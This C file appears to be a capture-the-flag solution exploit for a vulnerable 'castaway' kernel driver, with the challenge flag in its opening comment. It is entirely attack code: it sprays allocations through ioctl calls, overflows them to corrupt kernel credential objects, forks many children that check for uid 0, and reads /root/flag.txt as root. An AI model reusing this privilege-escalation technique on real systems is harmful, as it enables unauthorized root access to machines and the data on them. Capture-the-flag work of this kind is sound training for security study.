// corctf{3xpL01t1nG_cR3d_j@R_c0m3s_b@cK_fr0m_th3_d3@d_w1th_cr0Ss_c@ch3_0v3rfl0w}
#define _GNU_SOURCE
#include <inttypes.h>
#include <sys/types.h>
#include <stdio.h>
#include <pthread.h>
#include <errno.h>
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>
#include <signal.h>
#include <poll.h>
#include <string.h>
#include <sys/mman.h>
#include <assert.h>
#include <sys/syscall.h>
#include <sys/stat.h>
#include <sys/ioctl.h>
#include <sys/prctl.h>

#define ALLOC 0xcafebabe
#define EDIT  0xf00dbabe

int fd = 0, seq_fd = 0, qid = 0;
static int page_size = 0x1000;
unsigned long global_sharer = 0, ret;
unsigned long kernel_base = 0, i = 0, j = 0;
char *c_ptr;
long condition = 0;
unsigned long pivot_point = 0;
char buf[0x1000];

void alloc()
{
	int ret = ioctl(fd, ALLOC, NULL);
	if (ret < 0)	exit(printf("Index: 0x%lx allocation failed.", ret));
}

void edit(unsigned long idx, unsigned long size, unsigned long data)
{
	unsigned long arg[3];
	arg[0] = idx;
	arg[1] = size;
	arg[2] = data;
	int ret = ioctl(fd, EDIT, arg);
	if (ret < 0)	exit(printf("Write: %s write failed.", data));
}

int main()
{
	// system("cat /symbols | grep castaway");
	// system("cat /symbols | grep \" _text\"");

	fd = open("/dev/castaway", O_RDWR);
	if (fd<=0)	exit(puts("ERROR in open(fd)"));

	memset(buf, 0x00, 0x1000);
	for (j=0; j<50; j++)
	{
		for (i=0; i<8; i++)	alloc();

		setuid(0);
		for (i=0; i<0xf; i++)
		{
			ret = fork();
			assert(ret >= 0);
			if (!ret)
			{
				sleep(1);
				if (getuid() == 0)
				{
					puts("Wow got root!");
					setuid(0);
					system("cat /root/flag.txt");
				}
				else sleep(4);
				exit(0);
			}
		}
	}

	for (i=0; i<400; i++)
		edit(i, 0x200, buf);

	puts("wait now...");
	sleep(10000);
}